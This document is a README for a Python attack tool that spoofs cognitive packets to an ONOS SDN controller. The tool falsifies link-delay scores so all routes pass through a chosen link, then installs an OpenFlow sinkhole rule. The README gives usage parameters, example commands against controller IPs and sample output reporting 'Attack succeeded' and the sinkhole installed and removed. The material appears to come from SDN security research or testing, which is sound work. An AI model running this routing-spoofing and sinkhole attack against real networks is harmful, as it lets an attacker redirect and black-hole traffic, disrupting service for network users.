# Cognitive Packet Spoofer
## Contains the Cognitive Packet Spoofer for the sinkhole attack scenario
## Requirements
* Python 3.8 or higher
* Modules stated in the requirements.txt file
* Sudo / Administrator privilages
* Access to the controller over the management network plane
## Parameters
To obtain the list of the parameters type --help as a parameter.
```bash
CognitivePacketSpoofer.py [-h] [--sleep SLEEP] [--maxiter MAXITER]
                                 [--dont-spoof-on [DONT_SPOOF_ON [DONT_SPOOF_ON ...]]]
                                 [--spoof-on [SPOOF_ON [SPOOF_ON ...]]]
                                 ctrlIP link deviceID

positional arguments:
  ctrlIP                This is the IP of the controller.
  link                  Link that will receive low delay score. Other links
                        will receive high delay scores in spoofed
                        packets.Notation- srcIP-dstIP
  deviceID              ID of the device on which the sinkhole will be
                        installed.

optional arguments:
  -h, --help            show this help message and exit
  --sleep SLEEP         Sleep between two chunks of spoofed cognitive packets
                        in seconds. Default is 0
  --maxiter MAXITER     Number of times spoofer will send all of the possible
                        spoofed packets. Default is 100.
  --dont-spoof-on [DONT_SPOOF_ON [DONT_SPOOF_ON ...]]
                        Links that will not be affected by spoofing. Cannot be
                        used with --spoofOn parameter. Use notation srcIP-
                        dstIP srcIP2-dstIP2
  --spoof-on [SPOOF_ON [SPOOF_ON ...]]
                        Provide links that will be spoofed. Cannot be used
                        with --dontSpoofOn parameter. Use notation srcIP-dstIP
                        srcIP2-dstIP2
 ```
# Running the Cognitive Packet Spoofer

To run the spoofer with minimal number of positional arguments type:
```bash
python3 CognitivePacketSpoofer.py 10.0.1.123 10.1.1.1-10.1.1.2 of:0000000000000001
```
This will result in spoofing cognitive packets in that way that the link between daemon 10.1.1.1 and daemon 10.1.1.2 will be treated by the controller as a link with lowest possible score. All other links will be treated as links with high delay. This will cause that all possible routes will be directed via selected link.

To select links that will not be spoofed type:
```bash
python3 CognitivePacketSpoofer.py 10.0.1.123 10.1.1.1-10.1.1.2 of:0000000000000001 --dont-spoof-on 10.1.1.3-10.1.1.4 10.1.1.4-10.1.1.5
```
This will cause the Cognitive Packet Spoofer to spoof cognitive packets for all of the links but provided as a parameter. Number of links must be in range <1,N> where N is equal the number of all links in the netwokrk. Same syntax is used to define spoof-on parameter. Note that both dont-spoof-on and spoof-on are mutually excluisve.

# Example (correct) output

```bash
python3 CognitivePacketSpoofer.py 192.168.100.36 10.1.1.1-10.1.1.2 of:0000000000000001 --maxiter 10 --sleep 0 --spoof-on 10.1.1.3-10.1.1.2 10.1.1.4-10.1.1.3 10.1.1.4-10.1.1.2
Starting with gathering info on daemons in the network. Fetching data from http://192.168.100.36:8181/onos/rnn/SRE/cnm
Fetched the CNM from the controller
Fetched the deamons list from the controller
Fetched IPs of the daemons:  ['10.1.1.5', '10.1.1.4', '10.1.1.3', '10.1.1.2', '10.1.1.1', '10.1.1.6', '10.1.1.7', '10.1.1.8', '10.1.1.9', '10.1.1.10']
Checking if provided link 10.1.1.1-10.1.1.2 is among the daemons IPs
Provided link is correct.
Dont Spoof on list :  []
Spoof On list:  [('10.1.1.3', '10.1.1.2'), ('10.1.1.4', '10.1.1.3'), ('10.1.1.4', '10.1.1.2')]
Starting spoofing packets
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  0.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  10.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  20.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  30.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  40.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  50.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  60.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  70.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  80.0 %
Sent packets with delay  [('delay=500', 6), ('delay=1', 2)]  Percent ready  90.0 %
Attack succeeded.
Installing sinkhole on device  of:0000000000000001
Successfully installed the OpenFlow rule for sinkhole attack.
To delete that sinkhole OF rule press enter
[ENTER]
Deleting using the flow id  45035997712501612
Flow with id 45035997712501612 was deleted successfully with response: OK
Cleaning up...
Cleanup ready
```
